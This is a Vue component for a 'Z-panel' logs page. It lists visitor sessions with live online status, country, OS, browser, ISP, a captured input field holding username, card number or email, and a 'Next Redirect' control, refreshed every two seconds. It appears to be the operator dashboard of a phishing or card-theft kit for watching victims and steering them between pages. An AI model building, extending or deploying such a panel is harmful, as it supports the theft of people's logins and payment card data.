<script>
import { ref,defineComponent, reactive, computed, createApp, h} from 'vue';
import highlightjs from '@/components/plugins/Highlightjs.vue';
import vueTable from '@/components/plugins/VueTable.vue';
import navscrollto from '@/components/app/NavScrollTo.vue';
import { useAppVariableStore } from '@/stores/app-variable';
import { useSessionStore } from '@/stores/sessionStore';
import { ScrollSpy } from 'bootstrap';

const appVariable = useAppVariableStore();
const sessionStore = useSessionStore();

let SessionIDSearch= ref("");
let pageIDSearch= ref("");
let InputSearch= ref("");
let filter = reactive({enabled:false,count:0});
let onlineStatus=function(str){
	try{
		let ts=parseInt(str);
		let d=new Date(ts*1000);
		let now=new Date();
		let seconds = parseInt(Math.abs(now.getTime() - d.getTime())/1000);
		if(seconds <= 5){
			return "Online"
		}
		if(seconds > 5 && seconds<60){
			return "Offline, seen just now"
		}
		if(seconds >= 60 && seconds<3600){
			let minutes=Math.round(seconds/60)
			return "Offline, seen "+minutes+" minutes ago"
		}
		if(seconds>=3600){
			return "Offline, seen along time ago"
		}
	}
	catch(e){
		return "-"
	}
};
export default {
	data () {
		let searchFields={
			SessionIDSearch,
			pageIDSearch,
			InputSearch,
		}
		const table = reactive({
	        pageOptions:[{value:50,text:"50"}],
			columns: [
			{
				label: "Status",
				field: "Last_Online",
				width: "6%",
				sortable: true,
				display: function (row) {
					let status=onlineStatus(row.Last_Online);
					return (
						status
					);
				},
			},
			{
				label: "Panel ID",
				field: "panelId",
				width: "6%",
				sortable: true,
			},
			{
				label: "Session ID",
				field: "SessionID",
				width: "0%",
				sortable: true,
				isKey: true,
				display: function (row) {
					return (
					'<a href="/s/'+row.SessionID+'"/><button @click="onSessionClick(row.SessionId)"type="button" class="w-100 btn btn-outline-theme btn-sm">'+row.SessionID+'</button></a>'
					);
				},
			},
			{
				label: "Page ID",
				field: "pageID",
				width: "5%",
				sortable: true,
			},
			{
				label: "Info",
				field: "Info",
				width: "5%",
				sortable: true,
				display: function (row) {
					let osIcon="?"
					let isp="?"
					if(row.ISP){
						isp = row.ISP;
					}
					if (row.OS == 'WinNT') {
						osIcon='<i class="deviceicon fa fa-windows" aria-hidden="true"></i>'
					}
					if (row.OS == 'Android'){
						osIcon='<i class="deviceicon fa fa-apple" aria-hidden="true"></i>'
					}
					if (row.OS == 'iPad'  || row.OS == 'iPhone' || row.OS == 'MacOS') {
						osIcon='<i class="deviceicon fa fa-apple" aria-hidden="true"></i>'
					}
					if (row.Browser == 'Chrome') {
						osIcon+='<i class="deviceicon ml fa fa-chrome aria-hidden="true"></i>'
					}
					if (row.Browser == 'Safari') {
						osIcon+='<i class="deviceicon ml fa fa-safari aria-hidden="true"></i>'
					}
					let rowCountry="?";
					if (row.country){
						rowCountry = row.country
					}
					return (
						"" + rowCountry + " / " + osIcon + " / " + isp
					);
				},
			},
			{
				label: "Input",
				field: "Input",
				width: "5%",
				display: function (row) {
					let input="";
					if(row.username){
						input=row.username
					}
					if(row.cardnumber){
						input=row.cardnumber
					}
					if(row.email){
						input=row.email
					}
					return (
						input
					);
				},
				sortable: true,
			},
			{
				label: "Next Redirect",
				field: "Next_Redirect",
				width: "5%",
				sortable: true,
			},
			],
			rows: computed(()=>{
				return sessionStore.pageResults;
			}),
			totalRecordCount: computed(() => {
				return filter.enabled? filter.count : sessionStore.sessions.length;
			}),
			sortable: {
				order: "Last_Online",
				sort: "desc",
			},
		});

		const initTable = ({ el: tableComponent }) => {
			let headerTr = tableComponent.getElementsByClassName("vtl-thead-tr");
			if (! headerTr[0]) {
			return;
			}
			let cloneTr = headerTr[0].cloneNode(true); // Clone first <tr>
			let childTh = cloneTr.getElementsByClassName("vtl-thead-th");
			for(let i = 0; i < childTh.length; i++) {
			// Clear <th>'s HTML
			childTh[i].innerHTML = "";
			}

			// Create a input element and append to first <th>
			createApp(
			defineComponent({
				setup() {
				return () =>
					h("input", {
					class: "searchBar",
					value: searchFields.SessionIDSearch.value,
					onInput: (e) => {
						searchFields.SessionIDSearch.value = e.target.value;
						filterResults()
					},
					});
				},
			})
			).mount(childTh[2]);
			createApp(
			defineComponent({
				setup() {
				return () =>
					h("input", {
					class: "searchBar",
					value: searchFields.pageIDSearch.value,
					onInput: (e) => {
						searchFields.pageIDSearch.value = e.target.value;
						filterResults()
					},
					});
				},
			})
			).mount(childTh[3]);
			createApp(
			defineComponent({
				setup() {
				return () =>
					h("input", {
					class: "searchBar",
					value: searchFields.InputSearch.value,
					onInput: (e) => {
						searchFields.InputSearch.value = e.target.value;
						filterResults()
					},
					});
				},
			})
			).mount(childTh[4]);

			// append cloned element to the header after first <tr>
			headerTr[0].after(cloneTr)
		};

		const filterResults=() => {
			let filtered=false;
			let currentFilter=[...sessionStore.sessions];
			for(let field in searchFields){
				let fieldName=field.replace("Search","");
				let searchField = searchFields[field];
				let term = typeof searchField._value != undefined ? searchField._value : searchField;
				if(!term || term == ""){
					continue;
				}
				filtered=true;
				currentFilter=sessionStore.sessions.filter(session => {
					if(!session[fieldName]){
						let col=table.columns.filter(col => col.field == fieldName)
						if(!col){
							return false;
						}
						if(!col[0].display){
							return false;
						}
						let content=col[0].display(session);
						return content.includes(term.toLowerCase())
					}
					return session[fieldName].toLowerCase().includes(term.toLowerCase())
				})
			}
			sessionStore.selectedSessions=currentFilter;
			filter.count=currentFilter.length;
			filter.enabled=filtered;
			sessionStore.pageResults=currentFilter.slice(0,50);
		}

		const doSearch = (offset, limit, order, sort) => {
			table.isLoading = true;
			setTimeout(() => {
				table.isReSearch = offset == undefined ? true : false;
				if (sort == "asc") {
					let results = [...sessionStore.selectedSessions.map(a=>{
						if(a[order]==null){
							a[order]=""
						}
						return a
					})]
					
					results.sort((a, b) => a[order] > b[order] ? 1 : -1);
					sessionStore.pageResults=results.slice(offset, offset+limit)
				} else {
					let results = [...sessionStore.selectedSessions.map(a=>{
						if(a[order]==null){
							a[order]=""
						}
						return a
					})]
					results.sort((a, b) => a[order] < b[order] ? 1 : -1);
					sessionStore.pageResults=results.slice(offset, offset+limit)
				}
				table.sortable.order = order;
				table.sortable.sort = sort;
			}, 600);
		};
		

		return {
			searchFields,
			table,
			doSearch,
			initTable,
			selectedPanel:"ALL",
			updateLogTimeout:null,
			currentTablePage:1
		}
	},
	components: {
		highlightjs: highlightjs,
		navScrollTo: navscrollto,
		vueTable: vueTable
	},
	methods: {
		loadPanelList: async function(){
			await sessionStore.getPanelList(false,false)
			this.onPanelSelect({target:{value:"ALL"}})
		},
		onPanelSelect:function(ev,isUpdate=false){
			let selectedValue=ev.target.value;
			let panelChange=false
			if(this.updateLogTimeout && (selectedValue != sessionStore.selectedPanelName)){
			    clearTimeout(this.updateLogTimeout)
			    panelChange=true;
			    this.currentTablePage=1;
			}
			sessionStore.selectedPanelName=selectedValue
			if(selectedValue==""){
				sessionStore.sessions=[]
				return
			}
			if(selectedValue=="ALL"){
			    for(let i=0;i<sessionStore.panels.length;i++){
			        let panel = sessionStore.panels[i]
			        let mergeNext = (i != 0 || !panelChange) ? true : false
			        sessionStore.getSessionList(panel.panelId,panel.nodeID,mergeNext,isUpdate)
			    }
			}
			else{
    			let valueParts=selectedValue.split("@");
    			let panelId=valueParts[0];
    			let nodeId=valueParts[1];
			    sessionStore.getSessionList(panelId,nodeId,true && !panelChange,isUpdate);
		    }
			this.updateLogTimeout=setTimeout(()=>{
			    this.onPanelSelect(ev,true);
			},2000)
		}
	},
	computed:{
		panels: function(){
			return sessionStore.panels
		},
		sessions: function(){
			return sessionStore.sessions
		},
		selectedPanelName: function(){
			return sessionStore.selectedPanelName
		}
	},
	mounted() {
		sessionStore.selectedPanelName="ALL"
		this.loadPanelList()
		new ScrollSpy(document.body, {
			target: '#sidebar-bootstrap',
			offset: 200
		})
	}
}
</script>
<style>
	.log-select{
		background: rgba(0,0,0,0.3);
		color: white;
		padding: 0.5em;
		border-radius: 0.5em;
		font-size: 1.15em;
		margin-bottom: 0.5em;
	}
	option{
		background: rgba(0,0,0);
	}
	.deviceicon{
		font-size:1.2em
	}
	.ml{
		margin-left:0.25em
	}
	.searchBar{
		width: 100%;
		border-radius: 0.5em;
		background-color: rgba(0,0,0,0);
		border: 2px solid grey;
		color: white;
	}
</style>
<template>
	<ul class="breadcrumb">
		<li class="breadcrumb-item"><a href="#">Z-panel</a></li>
		<li class="breadcrumb-item active">Logs</li>
	</ul>
	
	<h1 class="page-header">
	</h1>
		<!-- BEGIN #vue3TableLite -->
		<select class="log-select" @change="onPanelSelect($event)" v-model="selectedPanelName" :value="selectedPanelName">
			<option v-if="panels" v-for="panel in panels" :value="panel.panelId+'@'+panel.nodeID">{{panel.panelId}} @ {{panel.nodeID }}</option>
			<option value="ALL">Show All</option>
			<option disabled v-if="!panels" value="no panels"></option>
		</select>
		<br/>
		<div id="vue3TableLite" class="mb-5">
		    <div v-if="selectedPanelName!='ALL'">
		        			<h4>Sessions for panel {{selectedPanelName}}</h4>
		    </div>
		    <div v-else>
		        <h4>Sessions for all panels.</h4>
		    </div>
			<br/>
			<p v-if="!selectedPanelName">Select a panel to view session data</p>
				<card-body>
					<vue-table  v-if="sessions" class="vue-table"
						:is-slot-mode="true"
						:columns="table.columns"
						:rows="table.rows"
						:total="table.totalRecordCount"
						:sortable="table.sortable"
						@VnodeMounted="initTable"
						:pageOptions="table.pageOptions"
						:page="currentTablePage"
						@do-search="doSearch">
					    
					</vue-table>
				</card-body>
				
			
		</div>
		<!-- END #vue3TableLite -->

	<p>
	
	</p>
</template>


